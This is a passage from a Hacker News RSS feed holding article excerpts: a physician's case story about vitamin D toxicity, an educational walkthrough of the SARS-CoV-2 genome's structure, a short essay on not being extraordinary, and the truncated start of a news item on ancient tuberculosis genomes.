resorted to what doctors often reach for when confronted with mystery ailments: psychiatric illness. </p><p id="viewer-fu7id">Shannon would be hospitalized several times for “catatonia,” a general symptom describing difficulty with speaking or moving that is caused by certain psychiatric conditions like depression and schizophrenia. Though she had never exhibited mental illness before, doctors assumed that Shannon had developed a severe psychiatric disorder. </p><p id="viewer-4pb27">Shannon’s husband, as well as her new psychiatrist, doubted this diagnosis, and sought second and third opinions. By the time she contacted me four months later, they had consulted multiple specialists at three different hospitals around the state, but still did not have an explanation for her physical and mental decline. There was something that all of the doctors had noticed, though. Her blood calcium levels were often mildly to moderately elevated above normal, up to 11.1 mg/dl (normal for her age would be up to 10.2 mg/dl). The cause of this was unclear, but her doctors did not believe that this incidental finding was relevant to her current issues, and did not pursue it. <strong>Shannon was not taking calcium supplements at all throughout this time, but her levels were still high.</strong> When she emailed me in February 2019, she was desperate for answers and thought the calcium levels might be a clue. </p><p id="viewer-1miap">My specialty is parathyroid disease, which is the most common cause of high calcium. Based on her parathyroid hormone tests, it did not appear that Shannon had parathyroid disease. But she had high calcium levels, and the rise in those levels correlated with the onset of her symptoms. High calcium levels might initially appear to be a good thing, since we need calcium for our bones. But they are not. High blood calcium levels usually indicate a serious illness.</p><div id="viewer-ep36c"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe" data-pin-media="https://static.wixstatic.com/media/3e0600_ab9b4f52fab24f4aaf3be163ee13d0ca~mv2.jpg/v1/fit/w_900,h_434,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_ab9b4f52fab24f4aaf3be163ee13d0ca~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-5d4om"><em>Calcium is known for its role in bone health, but its role in the brain and nervous system is just as important. Calcium levels need to be within a small range; anything too high or too low can cause problems.  Image by </em><a href="https://www.bigstockphoto.com/search/?contributor=madrock24" target="_blank" rel="noopener">madrock24</a> on <a href="http://bigstockphoto.com/" target="_blank" rel="noopener"><u>bigstockphoto.com</u></a></p><p id="viewer-115r5">Most patients with high calcium develop fatigue and body aches, and just generally feel bad. They may develop insomnia and palpitations, a feeling like the heart is racing. Some have more severe neurologic symptoms like muscle weakness and problems with balance, and some have psychiatric symptoms like depression and anxiety. Untreated high calcium can also lead to kidney stones, kidney failure, cardiac arrhythmias, headaches, and gastrointestinal problems. Shannon had some of the classic symptoms, as well as what appeared to be more severe “psychiatric” symptoms. I suspected they were all related to her calcium levels. </p><p id="viewer-bac7q">But why was her calcium high? The parathyroid glands exist to regulate calcium, and they do a very good job at it, keeping blood calcium within a tight range. Usually, a problem with calcium indicates a problem with the parathyroids. But over the last few years I have had more patients coming to me with high calcium related to something else: Vitamin D. </p><p id="viewer-6d1js"><strong>Vitamin D is a steroid hormone</strong>, in the same category as sex hormones like estrogen and testosterone, and glucocorticoids like the stress hormone cortisol. Steroid hormones are all made from cholesterol, and looking at their molecular structures, you can see the similarities. </p><div id="viewer-6s0p9"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe" data-pin-media="https://static.wixstatic.com/media/3e0600_1ef7e9201aae4b54be7b21f6f218627e~mv2.png/v1/fit/w_1586,h_972,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_1ef7e9201aae4b54be7b21f6f218627e~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-3upia">Like the other steroid hormones, Vitamin D acts on multiple organs and only tiny amounts of the molecule are required to have substantial effects. Anyone who has gone through puberty understands the impressive physiologic changes brought about by relatively small shifts in hormone levels. Not surprisingly, most steroid hormones are considered medications that require a physician's order. Vitamin D is an exception. In the U.S., high dose Vitamin D can be purchased by anyone, without a prescription, in most drugstores and grocery stores. It is called a dietary supplement, which sounds safer than a medication, but this is misleading. Due to its role in calcium absorption, high dose Vitamin D can cause serious problems. </p><p id="viewer-21t00">Eventually we worked out what happened with Shannon: In 2013 she was diagnosed with mild osteopenia, a thinning of the bones that can be a precursor to osteoporosis. Her Vitamin D was low at the time, so her physician started her on over-the-counter Vitamin D supplementation at 5000 international units (IUs) daily. Five years later, she was still on this dose, and her blood Vitamin D level had risen to 79 ng/ml. This level is within what many labs call the normal range, between 30 and 100 ng/ml, but levels above 70 are almost always a result of high dose supplementation, and I have seen toxicity with levels between 70 and 100 ng/ml. (A better “normal range” based on what I have seen would probably be between 30 and 60.) Vitamin D builds up over time, so the longer someone is on a high dose, the more likely she is to develop toxicity. Shannon’s calcium levels began rising in the fall of 2018, when her severe symptoms developed. </p><p id="viewer-c0tav">Ironically, Shannon started to recover because she became too sick to worry about taking her vitamins, and stopped taking Vitamin D in October. It often takes many months for high Vitamin D levels to drop, and it took six months for Shannon’s level to fall into the 50s. As it fell, her calcium level gradually started to normalize, and her symptoms slowly resolved. By May, she was starting to feel like herself again. </p><p id="viewer-208hf">I spoke with Shannon recently. All of the symptoms that characterized her frightening and rapid decline in health had resolved completely. Listening to this animated woman, it was difficult to imagine her unable to talk. The only lingering effects appeared to be a wariness of physicians and distrust of vitamins, both understandable. Shannon agrees that Vitamin D should be treated like a medication. “It’s a hormone!” she exclaimed. “If I had to take ‘Hormone D’, I would have questioned my doctor about why I needed it.” Shannon is now committed to educating others about Vitamin D. </p><p id="viewer-16oc8">Of course, there is a selection bias in who comes to me. There are people out there doing just fine on 5000 units of Vitamin D daily. I only see the ones who develop high calcium levels. But I see enough of them to know that this is not an exceptionally rare occurrence. I have been to lectures in which physicians have claimed that Vitamin D toxicity almost never occurs. In my experience, this is false. I have seen many cases of Vitamin D toxicity in people who were taking the recommended dose from an over-the-counter bottle.</p><p id="viewer-8pgar">Unfortunately, none of those patients were warned about the potential for Vitamin D to cause high calcium. They all believed that they were taking a supplement to improve health and that there was very little risk. Supplements don’t require prescriptions, and most do not have the warning labels that accompany medications. For Vitamin D, a steroid hormone, that may need to change. </p><p id="viewer-4ie1g"><strong>So, how much Vitamin D should you take? </strong></p><p id="viewer-9iecb">Vitamin D should be approached like a medication that is used to treat low calcium levels and low levels of the hormone called Vitamin D. The dose depends on your calcium and current Vitamin D levels, and needs to be adjusted appropriately in response to those levels. For my patients, I can and do give very specific recommendations on Vitamin D doses. In future posts, I can go through how I decide that. I will not give any recommendation without first knowing Vitamin D and calcium levels. </p><p id="viewer-ecd8g"><strong>Edited to add: This post should not be taken as a …</strong></p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe">https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe</a></em></p>]]>
            </description>
            <link>https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261948</guid>
            <pubDate>Mon, 24 Aug 2020 16:03:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Mechanist's Guide to the Coronavirus Genome]]>
            </title>
            <description>
<![CDATA[
Score 43 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24261853">thread link</a>) | @apsec112
<br/>
August 24, 2020 | https://csvoss.com/a-mechanists-guide-to-the-coronavirus-genome | <a href="https://web.archive.org/web/*/https://csvoss.com/a-mechanists-guide-to-the-coronavirus-genome">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>Hello and welcome to my Coronavirus Genome Walkthrough.</p>

<p>(Hoping someone comes out with that Vaccine Speedrun soon. This boss battle is really shaping up to be an intense one and we’ll need all the artifacts we can get.)</p>

<p>Here, I aim to provide a <em>mechanistic explanation</em> of the SARS-CoV-2 genome’s syntax and semantics. Let’s investigate what the SARS-CoV-2 viral genome actually does as if reading through code like a compiler, from nucleotides to amino acids all the way to proteins. From the four base pairs all the way up to the completed protein-coated virus, what is a virus like this is actually made of on the concrete, physical level?</p>

<h3 id="understanding-a-full-system">Understanding a Full System</h3>

<p>The underlying purpose of this essay is less about the coronavirus <em>per se</em> and more about how having a small—but functionally complete—piece of viral RNA to analyze gives me a unique opportunity to try to understand a complete self-replicating machine from scratch. This is not a feat that I would have the fortitude to manually replicate with the full human genome, for example—but the coronavirus genome, like the <a href="http://openworm.org/">nematode genome</a>, is small enough that we stand a chance at building a complete understanding. The task is perhaps akin to <a href="https://distill.pub/2018/building-blocks/">interpretability</a>, but for biological systems instead of artificial neural networks.</p>

<p>As a consequence, this essay is not intended to produce epidemiological conclusions; there are plenty of other sources for that! This essay is about fully understanding a biological system at the chemical and physical level.</p>

<h3 id="play-curiosity-and-mechanical-understanding">Play, Curiosity, and Mechanical Understanding</h3>

<p>Throughout this essay, I follow my curiosity in the style of <a href="https://en.wikipedia.org/wiki/Serious_play">serious play</a>: if I <a href="https://www.readthesequences.com/Noticing-Confusion-Sequence">notice I’m confused</a> about something, I look into it and explore it until I’m satisfied that I now understand, and that my understanding is <em>a <a href="https://plato.stanford.edu/entries/science-mechanisms/#ConMec">mechanical</a> understanding</em>. Things are made of stuff! It turns out that we can understand that stuff!</p>

<p>I may skip over some details that were not confusing to me during my own research, but your journey need not be the same as mine. If you’re confused about something while reading this essay, I encourage you to go and look it up! <a href="http://agentyduck.blogspot.com/2015/06/the-art-of-noticing.html">Notice</a> when your curiosity arises; that’s the meditation. It’s always possible to discover the <a href="http://samoburja.com/how-to-find-the-frontier-of-knowledge/">frontier of your own knowledge</a> and to expand it.</p>

<p>This all, at least, has been my intention as I set out to create this piece! As Ken Liu said of his philosophy while translating The Three-Body Problem, “I may not have succeeded, but these were the standards I had in mind as I set about my task.”</p>

<p>Part 1, here, covers just the genome and its translation to proteins. I hope to also write a Part 2 which would cover the structure and function of those proteins, their protein-protein interactions, and the full viral life cycle.</p>

<!--Finally, as you may already be able to tell, this essay also serves as a philosophical manifesto-by-example of how to think concretely about problems in biology. Along the way, I give some of my thoughts about the role of thermodynamics in molecular biology, legibility in complex systems, pedagogy, and the future of computational modeling.-->

<p>Let’s get started.</p>



<p>As a reminder, SARS-CoV-2 is a <em>positive-sense single-stranded RNA virus</em>.</p>



<p>What does this mean we can expect?</p>

<ol>
  <li><em>Single-stranded</em>: Its genome is a single strand of <a href="https://en.wikipedia.org/wiki/RNA">RNA</a> (ssRNA).</li>
  <li><em>Positive-sense</em>: That single strand of RNA can be immediately translated into protein by the ribosomes of the cell it infects.</li>
</ol>

<p>From this we can also infer that one of the proteins the virus encodes for must be <em>RNA-dependent RNA polymerase</em> (RdRP), a protein which synthesizes new RNA given an RNA template. That’s right: RNA → RNA. However, according to the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of molecular biology</a>, isn’t RNA → RNA an unconscionable heresy? Correspondingly, RdRP is not naturally found in cells! All known positive-sense ssRNA viruses therefore <em>must encode</em> RdRP in order to successfully commit this heresy.</p>



<p>…Wait a minute, the phrase “positive-sense ssRNA virus” implies the existence of <em>negative-sense</em> viruses. If those don’t encode their proteins directly, how can they possibly work?</p>

<h2 id="positive-sense-and-negative-sense">Positive sense and negative sense</h2>

<p>Negative-sense ssRNA viruses also exist! Influenza, Ebola, and measles are examples.</p>



<p>The inner contents of <em>negative-sense</em> ssRNA viruses consist not of an RNA genome but of a <em>ribonucleoprotein</em>, which incorporates both an RNA genome as well as a cohort of viral proteins capable of replicating RNA. Unlike positive-sense ssRNA viruses, negative-sense ssRNA viruses must travel with a working copy of their RNA-replicating proteins. This ribonucleoprotein has enzymatic activity!</p>

<h2 id="rdrp-as-drug-target">RdRP as drug target</h2>

<p>Since RdRP has (as far as I know) no legitimate purpose in human cells and is not naturally coded by them, might it offer a potential target for novel antiviral drugs?</p>

<p><a href="https://pubmed.ncbi.nlm.nih.gov/24102407/">Velkov et al. 2014</a> explores RdRP as a drug target for antivirals against the <a href="https://en.wikipedia.org/wiki/Henipavirus">Hendra virus</a>, a negative-sense ssRNA virus, though I am unable to find the full text.</p>

<!-- <div class="unfurl-embed-info-media-default gallery-item-selectable"><img class="unfurl-embed-card-feature-image" src="https://cdn.ncbi.nlm.nih.gov/pubmed/persistent/pubmed-meta-image.png"><div class="unfurl-embed-card-title unfurl-embed-card-title-default notranslate"><a href="https://pubmed.ncbi.nlm.nih.gov/24102407/">The RNA-dependent-RNA Polymerase, an Emerging Antiviral Drug Target for the Hendra Virus - PubMed</a></div><div class="unfurl-embed-card-description unfurl-embed-card-description-default notranslate"><div style="overflow: hidden; text-overflow: ellipsis; -webkit-box-orient: vertical; display: -webkit-box; -webkit-line-clamp: 2;">Australia is facing a major national medical challenge with the emergence of the Hendra virus (HeV) as a medically and economically important pathogen of humans and animals. Clinical symptoms of human HeV infection can include fever, hypotension, dizziness, encephalitis, respiratory haemorrhage and …</div></div><div class="unfurl-embed-card-url notranslate">pubmed.ncbi.nlm.nih.gov</div></div> -->

<blockquote>
  <p>This review examines the current knowledge based on the multi-domain architecture of the Hendra RdRP and highlights which essential domain functions represent tangible targets for drug development against this deadly disease.</p>
</blockquote>

<p>There must be some reason that developing antivirals against this protein is technically (or socially) complicated, or I’d have expected us to do it by now – there are a lot of RNA viruses that this drug target could theoretically hit. Flagging this discrepancy for further research.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">1</a></sup></p>



<p>Back to SARS-CoV-2! First, let’s get us a genome. Obviously this virus has seen some mutations as it’s spread around, as you can explore at <a href="https://nextstrain.org/ncov/global">NextStrain</a>, so we’ve technically got choices as to which one to analyze. For this thread I’ll just stick to analyzing <em>one</em> version of the genome: Wuhan-Hu-1.</p>

<p>As a reminder, each <code>A</code>, <code>G</code>, <code>C</code>, and <code>T</code> in a genome is one of the four <a href="https://en.wikipedia.org/wiki/Nucleotide">nucleotides</a>: <a href="https://en.wikipedia.org/wiki/Adenine">adenine</a>, <a href="https://en.wikipedia.org/wiki/Guanine">guanine</a>, <a href="https://en.wikipedia.org/wiki/Cytosine">cytosine</a>, and <a href="https://en.wikipedia.org/wiki/Thymine">thymine</a>. There are actually <a href="https://www.scripps.edu/romesberg/publications.html">plenty of ways to engineer</a> different <a href="https://pubmed.ncbi.nlm.nih.gov/22850726/">unnatural base pair systems</a> by adding <a href="https://science.sciencemag.org/content/363/6429/884">artificial nucleotides</a>, and these can even be integrated into <a href="https://www.pnas.org/content/98/9/4922">transcription</a> and <a href="https://www.nature.com/articles/nature24659">translation</a>, but <a href="https://carlbrannen.wordpress.com/2007/06/13/why-does-dna-only-use-4-nucleotides/">for</a> <a href="https://dreamerbiologist.wordpress.com/2013/02/16/why-did-nature-settle-on-just-four-nucleotides/">whatever</a> <a href="https://www.pnas.org/content/114/32/E6476">reason</a>, these four <a href="https://www.nature.com/articles/s41467-018-07389-2">and not others</a> are <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3331698/">what life ultimately ended up with</a>.</p>

<p><img src="https://csvoss.com/images/nucleotides.png"></p>
<p><small>The four nucleotides in DNA.</small></p>

<p>The genome of Wuhan-Hu-1 is available from <a href="https://www.ncbi.nlm.nih.gov/nuccore/MN908947.3">NCBI GenBank</a>. Since SARS-CoV-2 is an RNA virus, each <code>T</code> in this string technically represents a <code>U</code>, for <a href="https://en.wikipedia.org/wiki/Uracil">uracil</a>, RNA’s information-equivalent of thymine. The genome sequence is therefore:</p>

<div><div><pre><code>1     AUUAAAGGUU UAUACCUUCC CAGGUAACAA ACCAACCAAC UUUCGAUCUC UUGUAGAUCU
61    GUUCUCUAAA CGAACUUUAA AAUCUGUGUG GCUGUCACUC GGCUGCAUGC UUAGUGCACU
121   CACGCAGUAU AAUUAAUAAC UAAUUACUGU CGUUGACAGG ACACGAGUAA CUCGUCUAUC

...

29761 ACAGUGAACA AUGCUAGGGA GAGCUGCCUA UAUGGAAGAG CCCUAAUGUG UAAAAUUAAU
29821 UUUAGUAGUG CUAUCCCCAU GUGAUUUUAA UAGCUUCUUA GGAGAAUGAC AAAAAAAAAA
29881 AAAAAAAAAA AAAAAAAAAA AAA
</code></pre></div></div>

<p><a target="blank" href="https://benchling.com/s/seq-28k9llmwnY475iv7ogwF/edit">Follow along with the genome »</a></p>

<p>That’s 29,903 nucleotides. Since there are only four possible nucleotides, we can estimate the information compression value of each nucleotide at approximately 2 bits; the virus’s genome therefore requires only 7.5 kilobytes to store. That’s roughly as much data, byte for byte, as there are characters in this essay up to this point!</p>

<!-- <img src="https://s3-us-west-2.amazonaws.com/courses-images/wp-content/uploads/sites/110/2016/05/02212445/Figure_03_05_03.png"> -->

<p>Lay out those 29,903 nucleobases along a ribose-phosphate backbone, reading them left to right <a href="https://en.wikipedia.org/wiki/Directionality_(molecular_biology)">from the 5’ end to the 3’ end</a>, and bam – if that single molecule* were teleported into a cell, that’s 100% chemically sufficient** to infect a person with the plague du jour.</p>

<p>*plus the 5’ cap, discussed below</p>

<p>**modulo viral load effects??</p>

<p><img src="https://csvoss.com/images/polynucleotide.png"></p>
<p><small>How to interpret the Wuhan-Hu-1 genome as a complete molecule.</small></p>

<h2 id="poly-a-tail">Poly-A tail</h2>

<p>First question, and perhaps the most obvious one to the naked eye – what’s with all the <code>AAAAA</code> at the end of the viral genome?</p>

<div><div><pre><code>29821 ...                                                ... AAAAAAAAAA
29881 AAAAAAAAAA AAAAAAAAAA AAA
</code></pre></div></div>
<p><a target="blank" href="https://benchling.com/s/seq-28k9llmwnY475iv7ogwF/edit">Follow along with the genome »</a></p>

<p>It’s… yelling at us? Is it… suffering? Should we <a href="https://reducing-suffering.org/is-there-suffering-in-fundamental-physics/">help</a>?</p>

<p>Simple: It’s a <a href="https://bioinformatics.stackexchange.com/questions/11227/why-does-the-sars-cov2-coronavirus-genome-end-in-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">3’ poly-A tail</a>! This <a href="https://en.wikipedia.org/wiki/Polyadenylation">long tail of adenosine monomers</a> is extremely common in both our own cells and in RNA viruses.</p>

<p>Our own messenger RNA (mRNA) has a poly-A tail when it’s freshly produced in the nucleus so as to slow its degradation by the cell, allowing it to last long enough to be transcribed into protein. Naturally, if you’re a positive-strand RNA virus, you’re also going to want to last long enough to be transcribed into protein – so, you need the same feature, yourself.</p>

<p>Genome 0.11% explained. So far so good!</p>

<h2 id="5-cap">5’ cap</h2>

<p>While we’re discussing chemical features of mRNA, note that the viral genome presumably must also have a <a href="https://en.wikipedia.org/wiki/Five-prime_cap">5’ cap</a> – an extra <a href="https://en.wikipedia.org/wiki/7-Methylguanosine">7-methylguanosine</a> at the 5’ end of its RNA strand – just like mRNAs do.</p>

<p><img src="https://csvoss.com/images/5primecap.png"></p>
<p><small>A 5' cap, consisting of a 7-methylguanosine as well as methylation of the first two ribose sugars.</small></p>

<p>The cap is not directly shown in the viral genome sequence or mentioned in NCBI GenBank, but it is referenced in multiple papers discussing coronaviral genomes:</p>

<blockquote>
  <p>Since 2003, the outbreak of severe acute respiratory syndrome coronavirus has drawn increased attention and stimulated numerous studies on the molecular virology of coronaviruses. Here, we review the current understanding of the mechanisms adopted by coronaviruses to produce the 5′-cap structure and methylation modification of viral genomic RNAs.</p>
</blockquote>



<blockquote>
  <p>Coronaviruses possess a cap structure at the 5′ ends of viral genomic RNA and subgenomic RNAs, which is generated through consecutive methylations by virally encoded guanine-N7-methyltransferase (N7-MTase) and 2′-O-methyltransferase (2′-O-MTase). The coronaviral N7-MTase is unique for its physical linkage with an exoribonuclease (ExoN) harbored in nonstructural protein 14 (nsp14) of coronaviruses.</p>
</blockquote>



<blockquote>
  <p>Here, we have reconstituted complete SARS-CoV mRNA cap methylation <em>in vitro</em>.</p>
</blockquote>



<p>Like the poly-A tail, the 5’ cap helps the genome to be recognized and translated by ribosomes rather than destroyed by the cell’s immune response.</p>

<p>How does the virus even ensure that it receives a 5’ cap and a poly-A tail, not to mention its outer coat? Hopefully these questions will be resolved by our review of its genes… let’s move on to look at those!</p>



<p>Per the “Features” section of the genome, again from <a href="https://www.ncbi.nlm.nih.gov/nuccore/MN908947.3">NCBI GenBank</a>, here are the identifiable genes in this genome, in order:</p>

<ol>
  <li><code>Orf1ab</code> (for <a href="https://www.ncbi.nlm.nih.gov/protein/1791269089">orf1ab polyprotein</a>)</li>
  <li><code>S</code> (for <a href="https://www.ncbi.nlm.nih.gov/protein/1791269090">surface glycoprotein</a>)</li>
  <li><code>Orf3…</code></li></ol></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://csvoss.com/a-mechanists-guide-to-the-coronavirus-genome">https://csvoss.com/a-mechanists-guide-to-the-coronavirus-genome</a></em></p>]]>
            </description>
            <link>https://csvoss.com/a-mechanists-guide-to-the-coronavirus-genome</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261853</guid>
            <pubDate>Mon, 24 Aug 2020 15:55:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Being OK with not being extraordinary]]>
            </title>
            <description>
<![CDATA[
Score 799 | Comments 371 (<a href="https://news.ycombinator.com/item?id=24261826">thread link</a>) | @tmatthe
<br/>
August 24, 2020 | https://www.tiffanymatthe.com/not-extraordinary | <a href="https://web.archive.org/web/*/https://www.tiffanymatthe.com/not-extraordinary">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="skip-nav"><p><time>23.08.2020</time> — <a href="https://www.tiffanymatthe.com/tags/mindset">Mindset</a> — <span>2<!-- --> min read</span></p><section><img src="https://www.tiffanymatthe.com/static/c239dad4f9476bf8d02961e957aa71cf/a6c62/rock-climbing.jpg"><p>The internet always highlights the first place winners, the billionaires, the award-winning artists, the best-selling authors, the largest philanthropists, the extraordinary. Their stories are ones of success, of inspiration. They show us what is possible, and push us to achieve more.</p><p>But I don't feel inspired when I see extraordinary. I feel disappointed, jealous. My constant exposure to these amazing stories of success has normalized the extraordinary. I started comparing myself to these "normal" extraordinary people, and wondered why I was not them. This disappointment would incite me to take action, but after a few days of hard work, I would just quit. Quitting was easier; it helped me avoid thinking about the extraordinary and the negative dark clouds that I had shrouded it with.</p><p>This mentality was self-defeating. No one starts off as extraordinary, so that meant I quit a lot in the past. Over time, I came to realize two things:</p><ol><li>extraordinary as I perceived it was one-dimensional and unrealistic,</li><li>to improve, extraordinary could not be my end goal.</li></ol><p><strong>We need to redefine extraordinary.</strong> Extraordinary is often defined by the internet as a permanent trait someone has. They seemed to have been born with it, and extraordinary permeates their every pore. </p><p>But real extraordinary is nothing like this. Yes, it's exciting, but it also comes with sacrifices, limitations, and constraints. And it's not permanent. Extraordinary can disappear over time, just like you can achieve it over time.</p><p>Extraordinary also comes in many forms, and its value does not have to be measured in terms of money. You can be a tech giant who built their entire empire from scratch, just as you can be an amazing organizer who rallies entire communities together for a single cause. You can be a top-notch violinist player, or a inspiring storyteller. Extraordinary can be anything. Sometimes, when you realize what extraordinary really entails, you might not even want it. That's okay.</p><p><strong>Extraordinary should not be the end goal.</strong> I like to envision the extraordinary space in society as a small ledge at the top of a cliff. It gives you a beautiful view and a sense of accomplishment, but is also tight and oppressing. The sheer physical constraints means that not everyone will reach it. But that shouldn't stop you from putting a hand on the cliff and lifting yourself towards that ledge.</p><p>Why? Because the ledge is not the only thing that exists. There is a vast amount of space under it, other ledges, crooks, and crannies, that most people forget about. That space is just as valuable.</p><p>For example, someone starting out on Youtube might be disappointed that they don't have millions of subscribers. They don't think they have what it takes, so they quit. But most people don't only look at the channels with millions of subscribers. Smaller ones are as valuable for viewers, and the creators can get just as much value out of creating their original content and connecting with like-minded people.</p><p>So instead of searching for an extraordinary that is distorted and unrealistic, search to climb up to some space beneath the top ledge. You will be less disappointed and jealous, and you will still maintain some velocity in the right direction. Climbing to a higher vantage point can also unlock new forms of extraordinary that you might have never noticed before.</p><p>By consistently climbing and reassessing which direction to take, you might just reach your own extraordinary as a bonus.</p></section></div></div>]]>
            </description>
            <link>https://www.tiffanymatthe.com/not-extraordinary</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261826</guid>
            <pubDate>Mon, 24 Aug 2020 15:53:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remains of 17th century bishop support Neolithic emergence of tuberculosis]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24261768">thread link</a>) | @benbreen
<br/>
August 24, 2020 | https://www.shh.mpg.de/1825450/neolithic-emergence-of-tuberculosis | <a href="https://web.archive.org/web/*/https://www.shh.mpg.de/1825450/neolithic-emergence-of-tuberculosis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  <p>Bishop Peder Winstrup of Lund, Sweden passed away in the winter of 1679 at the age of 74 and was interred in a crypt at Lund Cathedral. Three centuries later, his astonishingly well-preserved remains provide insights to the origins of tuberculosis.</p>
  

  

  <p>In a recent study published in <em>Genome Biology</em>, researchers from the Max Planck Institute for the Science of Human History, Lund University and the Swedish Natural Historical Museum present analysis of the highest quality ancient Mycobacterium tuberculosis genome to date, suggesting the pathogen is much younger than previously believed.</p>
  
  
<figure data-description="Portrait of Bishop Peder Jensen Winstrup" data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hPREkxTkRnMWZRPT0tLTI3MDg3MzdiMmY2NGU0NDFmNGExNzhlM2UwMDI4NTE5ZDQxZTFmN2MiIGRhdGEtYWx0PSJvcmlnaW5hbCIgZGF0YS1jbGFzcz0iIj48c291cmNlIG1lZGlhPSIobWF4LXdpZHRoOiA3NjdweCkiIHNyY3NldD0iLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TkRFMExDSnZZbXBmYVdRaU9qRTRNalUwT0RWOS0tZjMxNDY4ODU1NDM0MDBmMTNmZmVhNjI3MGNjMjNiNjlmYmI2ZjAwZiA0MTR3LCAvMTgyNTQ4NS9vcmlnaW5hbC0xNTk3ODM4OTg3LmpwZWc/dD1leUozYVdSMGFDSTZNemMxTENKdlltcGZhV1FpT2pFNE1qVTBPRFY5LS01MGQ2NDAwOTI3ZGQ0ZWFkYTgyZWFjNjE2YzQxNjdkMWZiOWJkM2I4IDM3NXcsIC8xODI1NDg1L29yaWdpbmFsLTE1OTc4Mzg5ODcuanBlZz90PWV5SjNhV1IwYUNJNk16SXdMQ0p2WW1wZmFXUWlPakU0TWpVME9EVjktLWE2ZGMwMzI3OTU2OWZhY2E3MDU5YTNmZTJmMTU1OTA3ZWUxMDA5Y2MgMzIwdywgLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TkRFeExDSnZZbXBmYVdRaU9qRTRNalUwT0RWOS0tMzI1OTk1ZmIwMGRhMmUwYzZiYjQyMTc2N2U2MzM3YTk4OGI5ZjQ2NiA0MTF3LCAvMTgyNTQ4NS9vcmlnaW5hbC0xNTk3ODM4OTg3LmpwZWc/dD1leUozYVdSMGFDSTZORGd3TENKdlltcGZhV1FpT2pFNE1qVTBPRFY5LS0wYjM0NWZkYTZkMzgxMTMwZGI0MzQ3OWZkYWY2Y2M0ZTY4NzZlYWM1IDQ4MHcsIC8xODI1NDg1L29yaWdpbmFsLTE1OTc4Mzg5ODcuanBlZz90PWV5SjNhV1IwYUNJNk16WXdMQ0p2WW1wZmFXUWlPakU0TWpVME9EVjktLWQ3ZmU5YThiMDRlZGQyZGVkNWExNmRhYjQ1OGVlNjQ1MWFmOTM5N2MgMzYwdywgLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2T0RJNExDSnZZbXBmYVdRaU9qRTRNalUwT0RWOS0tMTNjMmM2MjUyMWRlZmI0NDgyNTZkYTRmMTU2ZjIxYTY3ODM3MDY2MCA4Mjh3LCAvMTgyNTQ4NS9vcmlnaW5hbC0xNTk3ODM4OTg3LmpwZWc/dD1l